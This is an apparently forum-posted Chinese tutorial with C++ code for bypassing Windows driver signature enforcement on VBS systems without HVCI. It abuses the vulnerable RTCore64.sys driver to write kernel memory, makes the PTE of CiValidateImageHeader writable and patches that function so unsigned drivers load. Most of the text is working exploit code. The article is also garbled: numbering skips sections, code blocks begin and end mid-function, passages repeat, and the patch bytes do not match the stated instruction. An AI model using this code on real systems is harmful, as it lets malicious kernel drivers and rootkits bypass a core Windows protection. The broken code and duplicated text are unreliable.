
# [原创]在开启VBS的环境下绕过驱动签名强制

## 引言

在 Windows 系统的安全防护体系中，驱动程序强制签名（Driver Signature Enforcement，DSE）是一项重要的安全机制，它用于防止攻击者将未签名的驱动程序加载到内核中，从而保护内核免受恶意代码的攻击。然而，随着攻击者技术的不断发展，针对 DSE 的绕过技术也逐渐出现。同时，微软推出的基于虚拟化的安全（Virtualization-Based Security，VBS）技术试图加强对内核的保护，但在未结合管理程序代码完整性（Hypervisor-Protected Code Integrity，HVCI）的情况下，仍然存在被绕过的可能。本文将详细介绍在没有开启 HVCI 的 VBS 环境下进行 DSE 绕过。

## 一、禁用驱动签名强制

在高版本的 Windows 系统中，DSE 由 `ci.dll` 内核模块实现，该模块中存在一个名为 `g_CiOptions` 的全局变量，将该变量设置为 `0` 可以完全禁用 DSE。但在 Windows 10 引入 VBS 机制后，这种直接修改变量的方法失效了，于是我们就看到了下面这一幕：

## 二、VBS 的防护原理

VBS 是 Windows 10 和 11 系统中默认启用的安全机制，它提供了一个受管理程序保护的环境，运行第二个 “安全内核”，传统的 Ring-0 级别的内核无法触及该环境。VBS 通过内核数据保护（Kernel Data Protection，KDP）技术来保护 `g_CiOptions` 变量。

我们使用 Ghidra 导入 `ci.dll`，找到 `CipInitialize` 函数，我们可以看到有许多函数回调例程，我们点击 `CiInitializePolicy` 如图所示

![alt text](upload/attach/202604/1061323_E7MKBHU8M465EDM.png)

我们在 `CiInitializePolicy` 里一直向下翻找，可以看到 `g_CiOptions` 全局变量的地址传给了 `MmProtectDriverSection` 函数，如图所示

![alt text](upload/attach/202604/1061323_S87G5XY2D9EHG2K.png)

该函数的具体用法可以参考 MSDN，下面我就简单的列一下函数原型

```cpp
NTSTATUS MmProtectDriverSection(
[in] PVOID AddressWithinSection,
[in] SIZE_T Size,
[in] ULONG Flags
);
```

该函数使用 VSM 管理的 SLAT 表（二级地址转换）保护内核中数据段的物理内存。而参数 `AddressWithinSection` 是指向要保护有效数据的内存地址，且在受保护期间，无法删除此保护。

4. 寻找 `CiValidateImageHeader` 函数的地址

   由于 Windows 的版本差异，`CiValidateImageHeader` 函数的特征码可能不同，我们需要找一个相对稳定的特征码和相对稳定的搜索模式进行匹配。在这期间，我花费了大量时间去分析不同版本 Windows 系统中的 `ci.dll` 文件，尝试了多种特征码组合，最终才找到一个相对稳定的特征码和匹配模式。

   具体实现代码如下：

   ```cpp

   char mask[] = "xxxxxxxxxxxxxxxxxxxxxxx????xxxx";
   PBYTE funcAddr = (PBYTE)SearchPattern(gKernelImageExecuteBase, gKernelImageExecuteSize, pattern, mask);
   return (DWORD_PTR)funcAddr-(DWORD_PTR)gKernelImageBase;
   }
   DWORD_PTR GetCiValidateImageHeaderRVA()
   {
   PBYTE pCiInitialize = (PBYTE)gCiImageBase + GetFuncRVA(gCiImageBase, "CiInitialize");
   cout << "CI!CiInitialize Address：0x" << hex << (DWORD_PTR)gCiBase + GetFuncRVA(gCiImageBase, "CiInitialize") << endl;
   BYTE pattern[] = "\x48\x8b\xd6\x8b\xcd";
   char mask[] = "xxxxx";
   PBYTE pCipInitialize = (PBYTE)SearchPattern(pCiInitialize, 0x1000, pattern, mask);
   pCipInitialize += 5;
   INT32 offset = *(INT32*)(pCipInitialize + 1);
   pCipInitialize += 5;
   pCipInitialize += offset;
   cout << "CI!CipInitialize Address：0x" << hex << (DWORD_PTR)pCipInitialize - (DWORD_PTR)gCiImageBase + (DWORD_PTR)gCiBase;
   BYTE pattern2[] = "\x48\x8d\x05\x00\x00\x00\x00";
   char mask2[] = "xxx??xx";
   PBYTE uValueA = (PBYTE)SearchPattern(pCipInitialize, 0x2000, pattern2, mask2);
   INT32 offset2 = *(INT32*)(uValueA + 3);
   cout << "offset2=0x" << hex << offset2 << endl;
   DWORD_PTR next = (DWORD_PTR)uValueA + 7;
   return (next + offset2) - (DWORD_PTR)gCiImageBase;
   }
   ```

   该函数的工作原理如下：

   1. 首先获取 `CiInitialize` 函数的地址
   2. 在 `CiInitialize` 函数中搜索特征码 `\x48\x8b\xd6\x8b\xcd` 定位到 `CipInitialize` 函数的调用
   3. 解析调用指令的偏移量，计算出 `CipInitialize` 函数的地址
   4. 在 `CipInitialize` 函数中搜索特征码 `\x48\x8d\x05\x00\x00\x00\x00`，这是一个 `lea rax, [CiValidateImageHeader]` 指令的特征码
   5. 解析该指令的偏移量，计算出 `CiValidateImageHeader` 函数的相对虚拟地址（RVA）

5. 通过修改 PTE 项进行热修补操作

   找到 `CiValidateImageHeader` 函数后，我们需要修改其对应的页表项（PTE）权限，然后实施热修补。这是整个绕过过程的核心步骤，具体实现如下：

   1. 获取 `MiGetPteAddress` 函数信息

      我们需要反汇编 `MiGetPteAddress` 函数逻辑来找到计算参数和 PTE 基址。从之前的分析中，我们知道该函数的汇编代码如下：

      ```asm
      nt!MiGetPteAddress:
      fffff803`5c86b560: 48 c1 e9 09 shr rcx, 9
      fffff803`5c86b564: 48 b8 f8 ff ff ff 7f 00 00 mov rax, 7FFFFFFFF8h
      fffff803`5c86b56e: 48 23 c8 and rcx, rax
      fffff803`5c86b571: 48 b8 00 00 00 00 80 ac ff ff mov rax, 0FFFFAC8000000000h
      fffff803`5c86b57b: 48 03 c1 add rax, rcx
      fffff803`5c86b57e: c3 ret
      ```

      从代码中可以看到：

      - `shr rcx, 9`：将输入地址右移9位（对应4KB页大小）
      - `mov rax, 7FFFFFFFF8h`：加载掩码
      - `and rcx, rax`：清除低9位
      - `mov rax, 0FFFFAC8000000000h`：加载 PTE 基址
      - `add rax, rcx`：计算最终 PTE 地址
      - `ret`：返回结果

### 3.2 完整代码实现

**1. 获取 `MiGetPteAddress` 函数地址及 PTE 参数**

```cpp
// 获取 MiGetPteAddress 函数地址
DWORD_PTR miGetPteAddressFuncRVA = GetMiGetPteAddressFuncRVA();
cout << "MiGetPteAddress函数RVA：0x" << hex << miGetPteAddressFuncRVA << endl;
PVOID miGetPteAddressFunc = (PBYTE)kernelBase + miGetPteAddressFuncRVA;
PVOID miGetPteAddressFuncInImage = (PBYTE)gKernelImageBase + miGetPteAddressFuncRVA;
cout << "MiGetPteAddress函数地址：0x" << hex << (DWORD_PTR)miGetPteAddressFunc << endl;
// 读取 PTE 基址和计算参数
DWORD64 pteBaseAddress = 0;
KernelReadMemory((PBYTE)miGetPteAddressFunc + 19, (PBYTE)&pteBaseAddress, sizeof(pteBaseAddress));
BYTE uValueA = *(BYTE*)((DWORD64)miGetPteAddressFuncInImage + 0x03);
DWORD64 uValueB = *(DWORD64*)((DWORD64)miGetPteAddressFuncInImage + 0x06);
cout << "uValueA：0x" << hex << (DWORD)uValueA << endl;
cout << "uValueB：0x" << hex << uValueB << endl;
cout << "PTE基址：0x" << hex << pteBaseAddress << endl;
```

通过反汇编分析，我们可以准确提取出计算 PTE 地址所需的参数，这是实现内存权限修改的关键步骤。

**2. 计算 `CiValidateImageHeader` 函数的 PTE 地址**

```cpp
// 获取 CiValidateImageHeader 函数地址
PVOID pCiValidateImageHeader = (PVOID)((DWORD_PTR)gCiBase + GetCiValidateImageHeaderRVA());
cout << "CiValidateImageHeader函数地址：0x" << hex << (DWORD_PTR)pCiValidateImageHeader << endl;
// 计算 PTE 地址
ULONGLONG address = (ULONGLONG)pCiValidateImageHeader;
ULONG64* pte = (ULONG64*)((address >> uValueA & uValueB) + pteBaseAddress);
cout << hex << "PTE地址：0x" << (DWORD_PTR)pte << endl;
```

可以借助 WinDbg 的 `!pte [Address]` 指令来确定 PTE 地址是否正确。

**3. 修改 PTE 权限**

```cpp
// 读取并修改 PTE 值，设置可写标志
DWORD64 pteValue = 0;
KernelReadMemory(pte, (PBYTE)&pteValue, sizeof(pteValue));
// 设置可写标志（第1位）
pteValue = pteValue | 2;
KernelWriteMemory(pte, (PBYTE)&pteValue, sizeof(pteValue));
```

**4. 实施热修补**

```cpp
// 备份原始代码
BYTE originalValue[4] = { 0 };
KernelReadMemory(pCiValidateImageHeader, originalValue, sizeof(originalValue));
// 写入补丁：xor rax, rax; ret (返回 STATUS_SUCCESS)
KernelWriteMemory(pCiValidateImageHeader, (PBYTE)"\x48\x30\xc0\xc3", 4);
cout << "已成功修改 CiValidateImageHeader 函数，DSE 已绕过！" << endl;
```

**5. 写完要马上恢复原始状态，否则会触发 PatchGuard 蓝屏**

```cpp
// 恢复原始代码
KernelWriteMemory(pCiValidateImageHeader, originalValue, sizeof(originalValue));
// 恢复 PTE 权限
pteValue = pteValue ^ 2; // 清除可写标志
KernelWriteMemory(pte, (PBYTE)&pteValue, sizeof(pteValue));
```

成功执行代码后，系统的 DSE 保护机制将被临时绕过，此时可以加载未签名的驱动程序。

**7. 防护策略**

HVCI 通过 Hypervisor 利用 SLAT/EPT/NPT 提供的硬件虚拟化能力，在比普通内核更高的特权级别（Ring -1） 上管控内存页权限，普通内核态代码无法修改 Hypervisor 维护的页表。

在启用 HVCI 的环境下，可执行的内存页会被标记为只读且可执行（禁止写入），可写入的内存页（如数据区）会被标记为可写但不可执行。

当我们尝试在启用 HVCI 的 VBS 环境下使用这种方法绕过 DSE，就会发现：

 * @brief 获取PE文件的NT头
 * @param baseAddress PE文件基地址
 * @param ntHeaders 输出参数，指向NT头的指针
 * @return 成功返回TRUE，失败返回FALSE
 */
inline BOOL GetNTHeaders(PVOID baseAddress, PIMAGE_NT_HEADERS* ntHeaders)
{
    if (!baseAddress || !ntHeaders) return FALSE;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
    // 验证DOS头签名
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    // 计算NT头偏移
    *ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)baseAddress + dosHeader->e_lfanew);
    // 验证NT头签名
    if ((*ntHeaders)->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    return TRUE;
}

BOOL EnableDebugPrivilege()
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp = { 0 };
    // 打开当前进程令牌
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    // 查询调试权限LUID
    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid))
    {
        CloseHandle(hToken);
        return FALSE;
    }
    // 启用调试权限
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);

 * @return 成功返回模块基地址，失败返回NULL

PVOID GetKernelModuleBase(const char* ModuleName, size_t* ImageLength) {
    if (!ModuleName) return NULL;
    DWORD moduleLength = 0;
    // 查询系统模块信息所需缓冲区大小
    NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, NULL, 0, &moduleLength);
    if (status != STATUS_INFO_LENGTH_MISMATCH)

        return NULL;

    // 分配缓冲区存储模块信息
    PSYSTEM_MODULES modulesInfo = (PSYSTEM_MODULES)malloc(moduleLength);
    if (!modulesInfo)
    {
        cout << "分配模块信息内存失败" << endl;
        return NULL;
    }
    // 获取系统模块列表
    status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, modulesInfo, moduleLength, &moduleLength);
    if (status != STATUS_SUCCESS)
    {
        cout << "查询模块信息失败" << endl;
        free(modulesInfo);
        return NULL;
    }
    // 遍历模块列表查找目标模块
    for (DWORD i = 0; i < modulesInfo->ModulesCount; i++)
    {
        PCHAR moduleName = (PCHAR)(modulesInfo->Modules[i].FullPathName + modulesInfo->Modules[i].OffsetToFileName);
        if (!_strnicmp(moduleName, ModuleName, strlen(ModuleName)))
        {
            PVOID baseAddr = modulesInfo->Modules[i].ImageBase;
            if (ImageLength)
                *ImageLength = modulesInfo->Modules[i].ImageSize;
            free(modulesInfo);
            return baseAddr;
        }
    }
    free(modulesInfo);
    cout << "未找到目标模块" << endl;
    return NULL;
}
/**
 * @brief 内存特征码搜索（Pattern Scan）
 * @param baseAddr 搜索起始地址
 * @param size 搜索范围大小
 * @param pattern 特征码数组
 * @param mask 特征码掩码（?表示任意字节）
 * @return 成功返回匹配地址，失败返回NULL
 */
PVOID SearchPattern(PVOID baseAddr, SIZE_T size, BYTE* pattern, const char* mask)
{
    PVOID result = NULL;
    __int64 patternLength = strlen(mask);
    BOOL found = FALSE;
    // 遍历内存逐字节匹配特征码
    for (__int64 i = 0; i <= size - patternLength; i++) {
        found = TRUE;
        for (__int64 j = 0; j < patternLength; j++) {
            if (mask[j] != '?' && *(BYTE*)((DWORD_PTR)baseAddr + i + j) != pattern[j]) {
                found = FALSE;
                break;
            }
        }
        if (found) {
            result = (PVOID)((DWORD_PTR)baseAddr + i);
            break;
        }
    }
    return result;
}
/**
 * @brief 读取内核内存
 * @param TargetAddress 内核目标地址
 * @param lpBuffer 接收缓冲区
 * @param BufferSize 读取大小
 * @return 成功返回TRUE，失败返回FALSE
 */
BOOL KernelReadMemory(PVOID TargetAddress, PBYTE lpBuffer, size_t BufferSize)
{
    if (!gDevice) return FALSE;
    PBYTE baseAddress = (PBYTE)TargetAddress;
    // 逐字节读取（驱动单次仅支持读1字节）
    for (size_t i = 0; i < BufferSize; i++)
    {
        KERNEL_READ_REQUEST readRequest = { 0 };
        readRequest.BaseAddress = (DWORD64)(baseAddress + i);
        readRequest.ReadSize = 1;
        DWORD bytesReturned = 0;
        BOOL result = DeviceIoControl(gDevice, IOCTL_KERNEL_READ, &readRequest, 0x30,
            &readRequest, 0x30, &bytesReturned, NULL);
        if (!result)
        {
            DWORD err = GetLastError();
            cout << "读取内核内存失败，错误码：" << err << endl;
            return FALSE;
        }
        lpBuffer[i] = readRequest.ReadValue & 0xFF;
    }
    return TRUE;
}
/**
 * @brief 写入内核内存
 * @param TargetAddress 内核目标地址
 * @param lpBuffer 写入数据缓冲区
 * @param BufferSize 写入大小
 * @return 成功返回TRUE，失败返回FALSE
 */
BOOL KernelWriteMemory(PVOID TargetAddress, PBYTE lpBuffer, size_t BufferSize)
{
    if (!gDevice) return FALSE;
    PBYTE baseAddress = (PBYTE)TargetAddress;
    // 逐字节写入（驱动单次仅支持写1字节）
    for (size_t i = 0; i < BufferSize; i++)
    {
        KERNEL_WRITE_REQUEST writeRequest = { 0 };
        writeRequest.BaseAddress = baseAddress + i;
        writeRequest.WriteSize = 1;
        writeRequest.WriteValue = lpBuffer[i];
        DWORD bytesReturned = 0;
        BOOL result = DeviceIoControl(gDevice, IOCTL_KERNEL_WRITE, &writeRequest, 0x30,
            NULL, 0, &bytesReturned, NULL);
        if (!result)
            return FALSE;
    }
    return TRUE;
}

/**
 * @brief 映射内核镜像(ntoskrnl.exe)到本地进程空间
 * @return 成功返回TRUE，失败返回FALSE
 */
BOOL MapKernelImage()
{
    __try
    {
        HANDLE hFile = NULL;
        PVOID ImageBuffer = NULL;
        PVOID ImageMemory = NULL;
        BOOL result = FALSE;
        do
        {
            // 打开ntoskrnl.exe文件
            hFile = CreateFileW(L"C:\\Windows\\System32\\ntoskrnl.exe", GENERIC_READ, FILE_SHARE_READ,
                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile == INVALID_HANDLE_VALUE)
            {
                DWORD err = GetLastError();
                cout << "打开内核文件失败，错误码：" << err << endl;
                break;
            }
            // 获取文件大小
            LARGE_INTEGER fileSize = { 0 };
            if (!GetFileSizeEx(hFile, &fileSize))
            {
                cout << "获取内核文件大小失败" << endl;
                break;
            };
            size_t qwFileSize = fileSize.QuadPart;
            if (!qwFileSize)
            {
                cout << "内核文件大小无效" << endl;
                break;
            }
            // 分配缓冲区读取文件内容
            ImageBuffer = VirtualAlloc(NULL, qwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!ImageBuffer)
            {
                DWORD err = GetLastError();
                cout << "分配文件缓冲区失败，错误码：" << err << endl;
                break;
            }
            RtlSecureZeroMemory(ImageBuffer, qwFileSize);
            // 读取文件内容到缓冲区
            DWORD bytesRead = 0;
            if (!ReadFile(hFile, ImageBuffer, qwFileSize, &bytesRead, NULL) || bytesRead != qwFileSize)
            {
                DWORD err = GetLastError();
                cout << "读取内核文件失败，错误码：" << err << endl;
                break;
            }
            CloseHandle(hFile);
            hFile = NULL;
            // 获取PE文件NT头
            PIMAGE_NT_HEADERS ntHeaders = NULL;
            if (!GetNTHeaders(ImageBuffer, &ntHeaders))
            {
                cout << "获取内核镜像NT头失败" << endl;
                break;
            }
            // 分配内存映射PE镜像
            ImageMemory = VirtualAlloc(NULL, ntHeaders->OptionalHeader.SizeOfImage,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!ImageMemory)
            {

                cout << "分配镜像内存失败，错误码：" << err << endl;
                break;
            }
            RtlSecureZeroMemory(ImageMemory, ntHeaders->OptionalHeader.SizeOfImage);
            // 复制PE头
            memcpy(ImageMemory, ImageBuffer, ntHeaders->OptionalHeader.SizeOfHeaders);
            // 复制节数据
            PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
            for (DWORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
            {
                PBYTE dest = (PBYTE)ImageMemory + sectionHeader[i].VirtualAddress;
                PBYTE src = (PBYTE)ImageBuffer + sectionHeader[i].PointerToRawData;
                memcpy(dest, src, sectionHeader[i].SizeOfRawData);
            }
            // 释放文件缓冲区，保存镜像信息
            ImageBuffer = NULL;
            gKernelImageBase = ImageMemory;
            gKernelImageSize = ntHeaders->OptionalHeader.SizeOfImage;
            result = TRUE;
        } while (false);
        // 清理资源
        if (hFile && hFile != INVALID_HANDLE_VALUE)
            CloseHandle(hFile);
        if (ImageBuffer)
            VirtualFree(ImageBuffer, 0, MEM_RELEASE);
        return result;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        DWORD err = GetExceptionCode();
        cout << "映射内核镜像异常，异常码：0x" << hex << err << endl;
        ExitProcess(1);
    }
}

## 四、总结

在启用VBS（基于虚拟化的安全）但未开启HVCI（管理程序代码完整性）的环境下，通过代码热修补技术可绕过DSE（驱动签名强制）。

### 4.1 核心思路

在VBS环境下，`g_CiOptions`全局变量被内核数据保护（KDP）技术保护，无法直接修改。因此，我们采用了一种间接的方法：通过修改`CiValidateImageHeader`函数，使其在执行签名验证前直接返回`STATUS_SUCCESS`，从而绕过整个签名验证流程。

### 4.2 技术实现要点

1. 漏洞驱动利用：利用`RTCore64.sys`漏洞驱动实现对内核内存的读写操作，这是整个绕过过程的基础。
2. 内存映射：通过映射内核镜像和`ci.dll`镜像到用户空间，便于分析和定位关键函数。
3. 特征码搜索：使用特征码搜索技术定位`MiGetPteAddress`和`CiValidateImageHeader`等关键函数，提高了代码在不同Windows版本上的兼容性。
4. PTE操作：通过分析`MiGetPteAddress`函数，提取计算PTE地址所需的参数和基址，实现对页表项的精准定位和权限修改。
5. 热修补技术：在修改页表项权限后，对`CiValidateImageHeader`函数进行热修补，写入`xor rax, rax; ret`指令使其直接返回`STATUS_SUCCESS`。

### 4.3 局限性与注意事项

1. HVCI限制：此方法仅在未开启HVCI的VBS环境下有效。当HVCI开启时，内核代码会被进一步保护，无法通过此方法修改。
2. 蓝屏风险：在修改页表项权限后，需要在用户空间等待用户输入后恢复原始值，否则会导致 PatchGuard 蓝屏。

在 Windows 系统的安全防护体系中，驱动程序强制签名（Driver Signature Enforcement，DSE）是一项重要的安全机制，它用于防止攻击者将未签名的驱动程序加载到内核中，从而保护内核免受恶意代码的攻击。然而，随着攻击者技术的不断发展，针对 DSE 的绕过技术也逐渐出现。同时，微软推出的基于虚拟化的安全（Virtualization-Based Security，VBS）技术试图加强对内核的保护，但在未结合管理程序代码完整性（Hypervisor-Protected Code Integrity，HVCI）的情况下，仍然存在被绕过的可能。本文将详细介绍在没有开启 HVCI 的 VBS 环境下进行 DSE 绕过。

在高版本的 Windows 系统中，DSE 由 `ci.dll` 内核模块实现，该模块中存在一个名为`g_CiOptions`的全局变量，将该变量设置为`0`可以完全禁用 DSE。但在 Windows 10 引入 VBS 机制后，这种直接修改变量的方法失效了，于是我们就看到了下面这一幕：

![alt text](https://bbs.kanxue.com/upload/attach/202604/1061323_HPPVEN89ZT445A8.png)

VBS 是 Windows 10 和 11 系统中默认启用的安全机制，它提供了一个受管理程序保护的环境，运行第二个 “安全内核”，传统的 Ring-0 级别的内核无法触及该环境。VBS 通过内核数据保护（Kernel Data Protection，KDP）技术来保护`g_CiOptions`变量。

防护策略

HVCI 通过 Hypervisor 利用 SLAT/EPT/NPT 提供的硬件虚拟化能力，在比普通内核更高的特权级别（Ring -1） 上管控内存页权限，普通内核态代码无法修改 Hypervisor 维护的页表。

在启用HVCI的环境下可执行的内存页会被标记为只读且可执行（禁止写入），可写入的内存页（如数据区）会被标记为可写但不可执行。

当我们尝试在启用 HVCI 的 VBS 环境下使用这种方法绕过 DSE，就会发现：

![alt text](https://bbs.kanxue.com/upload/attach/202604/1061323_29NMMKN9JFCEX4P.png)

在启用VBS（基于虚拟化的安全）但未开启HVCI（管理程序代码完整性）的环境下，通过代码热修补技术可绕过DSE（驱动签名强制）。

在VBS环境下，`g_CiOptions`全局变量被内核数据保护（KDP）技术保护，无法直接修改。因此，我们采用了一种间接的方法：通过修改`CiValidateImageHeader`函数，使其在执行签名验证前直接返回`STATUS_SUCCESS`，从而绕过整个签名验证流程。
